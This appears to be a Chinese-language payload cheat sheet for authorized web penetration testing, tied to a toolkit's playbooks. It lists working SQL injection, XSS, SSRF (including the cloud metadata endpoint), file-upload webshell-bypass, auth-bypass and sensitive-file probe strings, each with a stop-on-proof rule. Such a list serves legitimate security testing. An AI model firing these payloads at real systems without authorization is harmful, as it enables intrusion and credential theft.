# Structured Payloads — 結構化 payload 集（紅線內使用）
# Source: src-hunter-skill payload 結構， adapted for JySecAI
# 用法：配合 playbooks/core-playbooks.md 逐條驗證；每次使用登記 playbook + 條目編號

## 01 SQLi 探測（PB-04）
- `'`                          # 閉合錯誤探測
- `' AND 1=1 -- ` / `' AND 1=2 -- `   # 布林差分對
- `' UNION SELECT NULL-- ` / `' UNION SELECT NULL,NULL-- `  # 欄位計數遞增
- `' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- `  # 表名（拿即停）

## 02 XSS 最小證明（PB-05）
- `jsqk<>"'`                              # 純標記探測編碼行為
- `<svg/onload=console.log('jsqk')>`      # HTML 上下文（console 不擾民）
- `"><img src=x onerror=console.log('jsqk')>`  # attr 閉合上下文
- `javascript:/*-/*%00/jsqk`              # URL/JS 上下文探測

## 03 SSRF 探測（PB-06）
- `http://<dnslog-sub>`                   # DNS 外帶（首选，無痕）
- `http://169.254.169.254/latest/meta-data/`   # 雲憑據線索（命中即停）
- `http://127.0.0.1:80/` · `http://127.0.0.1:3306/`   # 本地服務探測（僅連通性）

## 04 IDOR 差分（PB-01）
- 替換物：`{id}` → 同型別連續值（10023→10024）；請求僅重放 ≤3 次
- 對照組：A 原始請求（基線）、A 換 ID 請求（差分）、B 原始請求（校準）

## 05 上傳繞過（PB-03）
- 檔名：`shell.php.jpg` · `.php5` · `.phtml` · `%00.php`
- Content-Type 偽造：`image/png`（內容保持 webshell 探針 `<?php echo 'jsqk'; ?>`）
- 圖片馬：GIF89a 頭 + PHP 探針尾
- 驗證：`cmd=id` 單次，證明即停

## 06 未授權測試（PB-02）
- Header 剝離：逐個移除 `Authorization` / `Cookie` / `X-API-Key`
- 方法替換：GET↔POST、`X-HTTP-Method-Override: PUT`
- 版本回退：`/api/v2/` → `/api/v1/` → `/api/`

## 07 資訊洩露路徑（PB-07）
- `/.env` `/.git/config` `/.svn/entries` `/backup.zip` `/db.sql`
- `/?debug=1` `/phpinfo.php` `/actuator/env`（Spring）/ `/.DS_Store`
- 命中後：僅截頭部 20 行佐證，值一律遮罩

## 08 邏輯探測（PB-08）
- 金額：`1` → `0.01` → `-1`（停於提交前）
- 數量：`1` → `99999999999999`（溢位探測）
- 驗證碼：同 code 重放一次（僅證明可重放）

## 通用標記
MARKER = jsqk   # 所有探測字串統一攜帶，便於日誌歸因與覆蓋度統計
